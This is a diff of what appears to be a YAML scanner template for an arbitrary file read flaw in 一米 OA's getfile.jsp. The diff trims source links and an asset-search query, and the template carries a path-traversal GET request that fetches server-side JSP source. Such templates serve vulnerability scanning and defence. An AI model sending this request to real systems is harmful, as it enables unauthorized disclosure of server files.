@@ -3,14 +3,8 @@ info:
   name: 一米OAgetfile.jsp任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1e8c9e93ef456840e044da3912a94cbf
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 1e8c9e93ef456840e044da3912a94cbf
-    fofa: + hunter`app.name="一米 OA"`
 http:
 - raw:
   - 'GET /public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp HTTP/1.1
